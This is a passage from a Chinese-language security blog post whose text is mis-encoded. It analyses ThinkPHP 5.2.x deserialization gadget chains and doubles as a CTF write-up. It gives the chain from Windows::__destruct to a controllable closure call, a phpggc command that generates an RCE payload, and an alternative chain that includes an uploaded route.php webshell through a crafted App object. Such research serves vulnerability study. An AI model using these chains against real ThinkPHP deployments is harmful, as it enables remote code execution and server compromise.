<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">    $data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);<span class="comment">// relationå’Œvisibleå­˜åœ¨åŒä¸€ä¸ªkeyå°±è¡Œ</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>å»æ‰äº†æ— å…³çš„ä»£ç ï¼Œè¿™é‡Œ<code>$this-&gt;visible</code>ã€<code>$this-&gt;relation</code>å‡å¯æ§ï¼Œå¯ä¼ªé€ æ•°æ®è¿›å…¥<code>getAttr</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// æ£€æµ‹å±æ€§è·å–å™¨</span></span><br><span class="line">  $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);<span class="comment">// ç›´æ¥è¿”å›$nameçš„å€¼</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName]; <span class="comment">// withAttrå†…å®¹å¯æ§</span></span><br><span class="line">    $value   = $closure($value, <span class="keyword">$this</span>-&gt;data); <span class="comment">// åŠ¨æ€è°ƒç”¨å‡½æ•°</span></span><br><span class="line">	  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥å…³æ³¨<code>getValue</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°ã€å‡½æ•°å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯æ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„phpå‡½æ•°ï¼Œå¦ä¸€ç§æ˜¯åˆ©ç”¨tpè‡ªå¸¦çš„SerializableClosureè°ƒç”¨ï¼Œæ¥çœ‹ä¸€ä¸‹ç¬¬äºŒç§ã€‚</p>
<p><a href="https://github.com/opis/closure" target="_blank" rel="noopener">\Opis\Closure</a>å¯ç”¨äºåºåˆ—åŒ–åŒ¿åå‡½æ•°ï¼Œä½¿å¾—åŒ¿åå‡½æ•°åŒæ ·å¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç„¶åäº¤ç”±ä¸Šè¿°çš„<code>$closure($value, $this-&gt;data)</code>è°ƒç”¨æ‰§è¡Œã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;phpinfo();&#125;;</span><br><span class="line">$closure = <span class="keyword">new</span> \Opis\Closure\SerializableClosure($func);</span><br><span class="line">$closure($value, <span class="keyword">$this</span>-&gt;data);<span class="comment">// è¿™é‡Œçš„å‚æ•°å¯ä»¥ä¸ç”¨ç®¡</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸Šè¿°ä»£ç ä¸ºä¾‹ï¼Œå°†è°ƒç”¨phpinfoå‡½æ•°ã€‚</p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬åˆ†æå®Œäº†æ•´ä¸€ä¸ªè°ƒç”¨æµç¨‹ï¼Œå›é¡¾ä¸€ä¸‹</p>
<ol>
<li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br>  <code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²<code>filename</code>ï¼Œè¿™é‡Œçš„<code>filename</code>å¯æ§<br> å¯è§¦å‘<code>__toString</code>å‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„<code>__toString</code></li>
<li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br> <code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>åˆ›é€ ç¬¦åˆæ¡ä»¶çš„<code>relation</code>å’Œ<code>visible</code>-&gt; <code>getAttr</code><br> ä¸‹ä¸€æ­¥è°ƒç”¨<code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code>çš„<code>getValue</code>å‡½æ•°</li>
<li><code>vendor/topthink/framework/src/think/model/concern/Attribute.php</code><br><code>getValue</code> -&gt; <code>$closure</code>åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œä¸”è¯¥å†…å®¹å¯æ§<br>ä¸‹ä¸€æ­¥åˆ©ç”¨æœ‰ä¸¤ç§ï¼Œä¸€ç§æ‰¾ç¬¦åˆçš„phpå‡½æ•°ï¼Œå¦ä¸€ç§åˆ©ç”¨tpè‡ªå¸¦çš„<code>SerializableClosure</code>è°ƒç”¨</li>
<li><code>vendor/opis/closure/src/SerializableClosure.php</code><br>æ„é€ å¯åˆ©ç”¨çš„åŒ¿åå‡½æ•°</li>
</ol>
<p>æˆ‘æŠŠexpé›†æˆåˆ°äº†<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a>ä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE1 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚</p>
<h3 id="think-Db-php-callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰"><a href="#think-Db-php-callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰" class="headerlink" title="think/Db.php __callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰"></a>think/Db.php __callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰</h3><p>å‰é¢è¯´åˆ°5.1.37ç‰ˆæœ¬çš„åˆ©ç”¨é“¾çš„<code>__call</code>å‡½æ•°ï¼Œåœ¨5.2.xç‰ˆæœ¬æ²¡åŠæ³•ç”¨äº†ã€‚ä½†æ˜¯ä»<code>__destruct</code>åˆ°<code>__call</code>çš„é“¾è·¯æ˜¯é€šçš„ï¼Œæˆ‘ä»¬åªéœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ç”¨çš„<code>__call</code>å‡½æ•°å³å¯ã€‚</p>
<p>æ¥çœ‹ä¸€ä¸‹<code>vendor/topthink/framework/src/think/Db.php</code>çš„<code>__call</code>å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $class = <span class="keyword">$this</span>-&gt;config[<span class="string">'query'</span>];</span><br><span class="line"></span><br><span class="line">    $query = <span class="keyword">new</span> $class(<span class="keyword">$this</span>-&gt;connection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_user_func_array([$query, $method], $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$this-&gt;config</code>å’Œ<code>$this-&gt;connection</code>å‡å¯æ§ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„ç¬¦åˆæ¡ä»¶çš„ç±»ï¼Œè¿™é‡Œæ‰¾äº†<code>think\Url</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(App $app, array $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app    = $app;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_file($app-&gt;getRuntimePath() . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// è¯»å–è·¯ç”±æ˜ å°„æ–‡ä»¶</span></span><br><span class="line">        $app-&gt;route-&gt;import(<span class="keyword">include</span> $app-&gt;getRuntimePath() . <span class="string">'route.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ„é€ å™¨å¼•å…¥äº†RuntimePathä¸‹çš„route.phpæ–‡ä»¶ï¼Œå› ä¸ºè¿™é“é¢˜æ˜¯å…è®¸ä¸Šä¼ æ–‡ä»¶çš„ï¼Œæ‰€ä»¥åªè¦åœ¨å¯ä¸Šä¼ çš„ç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ªroute.phpçš„webshellå³å¯ã€‚è‡³äºRuntimePathï¼Œ<code>$app</code>ä¸ºå¯æ§å˜é‡ï¼Œç›´æ¥ä¿®æ”¹<code>$runtimePath</code>çš„å†…å®¹å³å¯ã€‚</p>
<p>æˆ‘ä»¬ç›´æ¥æ„é€ Appå¯¹è±¡ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $runtimePath;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $rootPath = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rootPath = $rootPath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;runtimePath = <span class="string">"/tmp/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = <span class="keyword">new</span> \think\route\RuleName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ„é€ æ€è·¯å¤ªæºœäº†ï¼Œè†œä¸€æ³¢ï¼šï¼‰</p>
<p>æ•´ç†ä¸€ä¸‹è¿‡ç¨‹</p>
<ol>
<li><code>vendor/topthink/framework/src/think/process/pipes/Windows.php</code><br><code>__destruct</code> -&gt;<code>removeFiles</code> -&gt;<code>file_exists</code> å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²<code>filename</code>ï¼Œè¿™é‡Œçš„<code>filename</code>å¯æ§<br>å¯è§¦å‘<code>__toString</code>å‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„<code>__toString</code></li>
<li><code>vendor/topthink/framework/src/think/model/concern/Conversion.php</code><br><code>__toString</code> -&gt; <code>toJson</code> -&gt; <code>toArray</code>-&gt;<code>appendAttrToArray</code>-&gt;<code>$relation</code>è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°ï¼Œè§¦å‘<code>__call</code></li>
<li><code>vendor/topthink/framework/src/think/Db.php</code><br><code>__call</code> -&gt; <code>new $class($this-&gt;connection)</code> è°ƒç”¨ä»»æ„ç±»çš„<code>__construct</code>å‡½æ•°</li>
<li><code>vendor/topthink/framework/src/think/Url.php</code><br>æ„é€ Appç±»ï¼Œè¾¾åˆ°<code>include</code>ä»»æ„æ–‡ä»¶çš„æ•ˆæœ</li>
</ol>


    
    
    
	  <div class="full-width auto-padding tags">
      
        <a href="/tags/cms/">cms</a>
      
	  </div>
    
  </section>
</article>
    </div>
  
</section>



      </div>
      <aside class='l_side'>
        
  <section class="m_widget about">

<div class="header">wh1t3p1g</div>
<div class="content">
<div class="desc">A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class="m_widget links">
<div class="header">Links</div>
<div class="content">
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class="name">orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class="name">warmeng</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://fr4nk.0kami.cn">
            <div class="name">fr4nk</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class="m_widget categories">
<div class="header">Categories</div>
<div class="content">
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class="name">codereview</div><div class="badget">10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class="name">ctf</div><div class="badget">5</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class="name">notes</div><div class="badget">12</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class="content">
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 20px; color: #000">cms</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 18px; color: #2b2b2b">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github" target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss" target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href="https://github.com/stkevintan/hexo-theme-material-flow" class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/node-waves/0.7.5/waves.min.js"></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
